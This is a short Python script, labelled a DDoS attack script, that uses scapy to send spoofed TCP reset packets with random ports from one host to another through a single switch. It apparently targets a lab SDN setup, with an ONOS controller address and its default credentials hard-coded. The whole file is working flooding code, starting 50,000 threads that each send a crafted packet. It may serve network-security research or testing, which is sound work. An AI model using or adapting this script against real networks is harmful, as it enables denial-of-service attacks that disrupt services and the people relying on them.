#DDOS ATTACK SCRIPT

from scapy.all import *
from scapy.layers.inet import IP, TCP, Ether, UDP

import requests
import random
import threading

# To demonstrate the attack on a switch s1, consider the topo: h1:0<--->s1:1, h2:0<--->s1:2,
# such that we send spoofed packets from h1 to h2; this means all packets are processed on one switch, i.e., s1.

onos_ip = "172.17.0.2"
usr = "onos"
pwd = "rocks"
rest_port = 8181

# constants to speed up function
t = '' #threading constant

# STEP ONE: get mac of attacker and target

# Get other hosts macs
# *** INPUT ***
hn_mac = 'd6:82:a7:d3:cd:79'

# Attacker host details
# *** INPUT ***
h1 = '02:2f:96:a8:2a:f8'

interface = 'h1-eth0'

ether = Ether(src=h1, dst=hn_mac)
ip = IP(src='10.0.0.2', dst='10.0.0.8', ttl=64)

def attk(itf, t):
    # encapsulation
    pkt = ether / ip / TCP(sport=random.randint(1,65535), dport=random.randint(1,65535), flags='R')
    sendp(pkt, iface=itf, verbose=False)

# ===== MAIN =====
n = 0
start = time.time()
while n <= 50000: #increase
    threading.Thread(target=attk, args=(interface, t)).start()
    n += 1

print(time.time() - start)
